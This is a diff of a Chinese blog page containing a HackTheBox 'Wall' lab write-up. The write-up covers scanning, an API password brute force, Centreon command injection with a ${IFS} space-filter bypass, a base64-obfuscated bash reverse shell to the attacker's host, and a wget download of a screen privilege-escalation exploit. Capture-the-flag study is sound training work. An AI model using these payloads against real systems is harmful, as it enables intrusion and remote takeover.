@@ -468,53 +468,35 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><img src="/2020/01/12/hackthebox-Wall/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Wall"><br><strong>本机ip:10.10.14.3</strong><br>(也许吧,记不得了hhh)<br><strong>靶机ip:10.10.10.157</strong></p>
 <p>然后回顾一下整个过程吧。首先第一步当然是使用hackthebox提供给我们的ovpn连接。这样我们就创建好了与靶机之间的虚拟专有网络。可以访问到题目。</p>
 <p>之后就是面对hackthebox上一众靶机的常规套路：使用nmap进行端口扫描（这应该也是正常渗透过程中的第一步）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA namp&#x2F;wall 10.10.10.157</span><br></pre></td></tr></table></figure>
-<p>我学习了下那位youtuber的好习惯，这里namp不仅做了扫描，同时还保存为文件方便回顾。</p>
+<pre><code>namp -sC -sV -oA namp/wall 10.10.10.157</code></pre><p>我学习了下那位youtuber的好习惯，这里namp不仅做了扫描，同时还保存为文件方便回顾。</p>
 <p>之后发现开放了两个端口，80与22,也就是http与ssh对应服务。尝试直接访问，也得到了apache的默认页面。基于ssh并无太多利用之处，可以直接从web页面下手。<br>那么先扫下目录，来看看有没有什么可能有趣的,在简单的FUZZ一下robots.txt,.htacess都无结果后，果断使用gobuster：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<pre><code>gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre><p>扫到了一个/monitoring，尝试访问，却发现提示unauthorized。并提示输入用户密码，尝试下admin-admin,admin-password,guest-guest等等可能的弱口令无果，于是得另辟蹊径。<br>顺便补一下webAPI中authorize跟authentication的区别：</p>
+<pre><code>身份验证（Authentication）：确定用户是谁。
 
-<p>扫到了一个/monitoring，尝试访问，却发现提示unauthorized。并提示输入用户密码，尝试下admin-admin,admin-password,guest-guest等等可能的弱口令无果，于是得另辟蹊径。<br>顺便补一下webAPI中authorize跟authentication的区别：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">身份验证（Authentication）：确定用户是谁。</span><br><span class="line"></span><br><span class="line">授权(Authorization)：确定用户能做什么，不能做什么。</span><br></pre></td></tr></table></figure>
-<p>这里从dalao那学到了一招：抓包后，当以GET方式访问/monitoring时，我们得到的是401 unauthorized,但如果以POST方式访问，就会的到页面提示，并拿到后续操作的页面目录  /centreon</p>
-<p>再度访问，终于得到一个centreon的登录界面，同时版本为19.04.0那么问题就回到用户密码上了。<br>为了能了解这一系统，当然需要谷歌了解下centreon到底为何物，以及有什么可以利用的。很快就可以发现，这一版本存在有sql注入，RCE命令执行等等漏洞；或者使用kali上的searchspolit</p>
-<figure class="highlight plain"><figcaption><span>centreon```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现有RCE等等漏洞以及利用，我们对RCEgetshell相对比较轻松，那么就不妨看看RCE的利用</span><br><span class="line">&#96;&#96;&#96; searchsploit  -x &quot;此处接利用的脚本文件地址&quot;</span><br></pre></td></tr></table></figure>
-<p>仔细审过后发现，从上面提到的种种漏洞到现在具体的RCE，我们都需要在autheticated的前提下利用，那么还是得从登陆界面的用户密码下手。</p>
+授权(Authorization)：确定用户能做什么，不能做什么。</code></pre><p>这里从dalao那学到了一招：抓包后，当以GET方式访问/monitoring时，我们得到的是401 unauthorized,但如果以POST方式访问，就会的到页面提示，并拿到后续操作的页面目录  /centreon</p>
+<p>再度访问，终于得到一个centreon的登录界面，同时版本为19.04.0那么问题就回到用户密码上了。<br>为了能了解这一系统，当然需要谷歌了解下centreon到底为何物，以及有什么可以利用的。很快就可以发现，这一版本存在有sql注入，RCE命令执行等等漏洞；或者使用kali上的searchspolit<br><code>searchsploit centreon</code><br>发现有RCE等等漏洞以及利用，我们对RCEgetshell相对比较轻松，那么就不妨看看RCE的利用<br><code>searchsploit  -x &quot;此处接利用的脚本文件地址&quot;</code><br>仔细审过后发现，从上面提到的种种漏洞到现在具体的RCE，我们都需要在autheticated的前提下利用，那么还是得从登陆界面的用户密码下手。</p>
 <p>这里又从大佬那学到了第二招：在登录界面随便输入尝试登录并抓包时，会发现burp抓包得内容除了admin,password参数，还会有centreon自带的token。这就给我们的暴力破解可能性画上了句号。那么还有其他方法爆破吗？有的，通过API来尝试： google后发现确实存在centreon的api,而且确实只传了username,password两个参数，是可以爆破的。<br>之后继续FUZZ，于是准备post访问：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br></pre></td></tr></table></figure>
-<p>并顺便传参admin=admin&amp;password=passowrd。发现返回bad crendentials。并且改掉username参数时返回的是一致的，这样就不好通过response来爆破。那只能猜测用户名是admin了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz  http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt  -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403</span><br></pre></td></tr></table></figure>
-<p>–hc 可以筛掉返回403的结果。<br>上面用的这个字典我好像kali上并没有，只能自己找字典用了。<br>很快得到正确的密码 password1……这个弱口令真的是强，简单归简单，总归人手FUZZ应该不太能FUZZ出来……</p>
+<pre><code>/centreon/api/index.php?action=authenticate </code></pre><p>并顺便传参admin=admin&amp;password=passowrd。发现返回bad crendentials。并且改掉username参数时返回的是一致的，这样就不好通过response来爆破。那只能猜测用户名是admin了。</p>
+<pre><code>wfuzz  http://10.10.10.157/centreon/api/index.php?action=authenticate -w /usr/share/seclist/Passwords/darkweb2017-top1000.txt  -d &quot;username=admin&amp;password=FUZZ&quot; --hc 403</code></pre><p>–hc 可以筛掉返回403的结果。<br>上面用的这个字典我好像kali上并没有，只能自己找字典用了。<br>很快得到正确的密码 password1……这个弱口令真的是强，简单归简单，总归人手FUZZ应该不太能FUZZ出来……</p>
 <p>之后就成功登陆，轮到我们大展身手了。在网上可以查到很多种利用，我参考了dalao的那种命令执行（像这种控制台里的确存在很多可以注入利用的地方）在centreon的configuration中可以进行命令执行,简单试下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 127.0.0.1;</span><br></pre></td></tr></table></figure>
-<p>linux的ping貌似与windows有区别。<br>然而在命令执行时失败了并返回403。继续尝试其他的发现可能是过滤了空格。于是使用常见的一种绕过手段：<code>${IFS}</code>绕过空格。<br>另外，我还学到了有别于自己原来垃圾的把空格一个个换成${IFS}的手段。直接在linux命令行中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
-<p>就得到了payload ,再度放在刚刚的命令执行空格中，保存，并export configuration以执行命令。发现成功了。<br>既然测试好了，那我们就直接getshell吧。<br>原payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
-<p>这里bash -c 是直接将后面的字符串内容执行命令。而后面bash -i等等就是bash反弹shell的命令了。(这里自己其实自学了好久，也折腾了不晒时间才成功在kali上拿到自己的一台公网vps的shell，之后如果写学习笔记再详细解释理解下)<br>这里不妨用base64编码下绕检查,我也不记得这里不用base64编码是否会产生被过滤bash的问题，但毕竟bash是高危命令，还是执行编码为妙。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64</span><br></pre></td></tr></table></figure>
-<p>得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;</span><br></pre></td></tr></table></figure>
-<p>那么绕过空格：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
-<p>现payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash;</span><br></pre></td></tr></table></figure>
-<p>记得最后要有分号。之后在自己kali上监听8888端口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
-<p>命令执行即可getshell。</p>
+<pre><code>ping -c 1 127.0.0.1;</code></pre><p>linux的ping貌似与windows有区别。<br>然而在命令执行时失败了并返回403。继续尝试其他的发现可能是过滤了空格。于是使用常见的一种绕过手段：<code>${IFS}</code>绕过空格。<br>另外，我还学到了有别于自己原来垃圾的把空格一个个换成${IFS}的手段。直接在linux命令行中</p>
+<pre><code>echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s/ /${IFS}/g&#39;</code></pre><p>就得到了payload ,再度放在刚刚的命令执行空格中，保存，并export configuration以执行命令。发现成功了。<br>既然测试好了，那我们就直接getshell吧。<br>原payload:</p>
+<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/8888 0&gt;&amp;1&#39;</code></pre><p>这里bash -c 是直接将后面的字符串内容执行命令。而后面bash -i等等就是bash反弹shell的命令了。(这里自己其实自学了好久，也折腾了不晒时间才成功在kali上拿到自己的一台公网vps的shell，之后如果写学习笔记再详细解释理解下)<br>这里不妨用base64编码下绕检查,我也不记得这里不用base64编码是否会产生被过滤bash的问题，但毕竟bash是高危命令，还是执行编码为妙。</p>
+<pre><code>echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/8888 0&gt;&amp;1&#39; &quot;|base 64</code></pre><p>得到：</p>
+<pre><code>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc=</code></pre><p>那么绕过空格：</p>
+<pre><code>echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc= | base4 -d | bash&quot; |sed &#39;s/ /${IFS}/g&#39;</code></pre><p>现payload:</p>
+<pre><code>echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc=${IFS}|${IFS}base4${IFS}-d${IFS}|${IFS}bash;</code></pre><p>记得最后要有分号。之后在自己kali上监听8888端口：</p>
+<pre><code>nc -lvp 8888</code></pre><p>命令执行即可getshell。</p>
 <h2 id="拿-user-权限"><a href="#拿-user-权限" class="headerlink" title="拿 user 权限"></a>拿 user 权限</h2><p>hackthebox的靶机拿下，并不只是简单的getshell,而是要分别拿到root权限与user权限下的两个文件中的flag提交才算成功。这里自己因为没什么提权经验，很大程度上参考了不少wp与视频才算成功。<br>先从简单的user开始：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p>发现user有shelby与sysmonitor两个。找一下shelby的内容后发现只有shelby有权限读user.txt即flag。<br>经过一番挖掘，可以发现能够找到/opt/.shelby/backup这一文件。<code>file backup</code>后发现是一个python编译文件，可能就是pyc吧。执行下<code>python backup</code><br>这时我们如果再ls -la，就会发现我们不知怎么已经完成了authentication。<br>进入目录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 backup</span><br></pre></td></tr></table></figure>
-<p>将结果在本机的vim保存为backup.pyc.b64，再base64解码，这样这样一个pyc文件就算到了本机了。然后我们用python 的uncompyle库反编译一下。还原了py文件。<br>从其中直接拿到shelby 的密码 ShelbyPassw@rdIsStrong!<br>ssh登录shelby即可读user.txt。</p>
+<pre><code>ls -la </code></pre><p>发现user有shelby与sysmonitor两个。找一下shelby的内容后发现只有shelby有权限读user.txt即flag。<br>经过一番挖掘，可以发现能够找到/opt/.shelby/backup这一文件。<code>file backup</code>后发现是一个python编译文件，可能就是pyc吧。执行下<code>python backup</code><br>这时我们如果再ls -la，就会发现我们不知怎么已经完成了authentication。<br>进入目录。</p>
+<pre><code>base64 backup</code></pre><p>将结果在本机的vim保存为backup.pyc.b64，再base64解码，这样这样一个pyc文件就算到了本机了。然后我们用python 的uncompyle库反编译一下。还原了py文件。<br>从其中直接拿到shelby 的密码 ShelbyPassw@rdIsStrong!<br>ssh登录shelby即可读user.txt。</p>
 <h2 id="拿-root-权限"><a href="#拿-root-权限" class="headerlink" title="拿 root 权限"></a>拿 root 权限</h2><p>拿root权限时我就比较尴尬了，因为这里root的payload可以直接拿到root跟shelby二者的权限。<br>参考了一个解法：</p>
 <blockquote>
 <p>/bin/screen-4.5.0<br>For this exact version there is a vulnerability that allows to escalate to root</p>
 </blockquote>
 <p>这里/bin下的screen版本允许我们直接利用漏洞拿到root权限。payload在此：<a href="https://github.com/XiphosResearch/exploits/tree/master/screen2root" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/screen2root</a><br>那接下来只用把脚本放到我们拿到shell的机子执行screenroot.sh即可。那么如何传输文件呢？这里运用到了python强大的功能，也是自己之前曾用过的SimpleHTTPServer</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpliHTTPServer</span><br></pre></td></tr></table></figure>
-<p>这样就默认监听8000端口了，先把脚本放在根目录。尝试<code>curl 10.10.14.3:8000/screenroot.sh</code>失败,没有安装curl。再尝试<code>wget 10.10.14.3:8000/screenroot.sh</code>成功，在靶机shell拿到脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash screenroot.sh</span><br></pre></td></tr></table></figure>
-<p>运行成功，进入shell的交互页面。cat /root/root.txt即可，还可以cat /home/shelby/user.txt拿到之前的userflag。</p>
+<pre><code>python -m SimpliHTTPServer</code></pre><p>这样就默认监听8000端口了，先把脚本放在根目录。尝试<code>curl 10.10.14.3:8000/screenroot.sh</code>失败,没有安装curl。再尝试<code>wget 10.10.14.3:8000/screenroot.sh</code>成功，在靶机shell拿到脚本。</p>
+<pre><code>bash screenroot.sh</code></pre><p>运行成功，进入shell的交互页面。cat /root/root.txt即可，还可以cat /home/shelby/user.txt拿到之前的userflag。</p>
 <p>大抵如此吧。当时即使在参考，自己也花了不少时间在getshell后的提权上，看来自己还要再多加了解学习呀。寒假已经开始，我也争取再拼一把，多学一些web方面的知识吧。</p>
 
   
@@ -717,7 +699,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -729,9 +711,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -864,6 +846,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1077,7 +1061,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1133,6 +1117,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
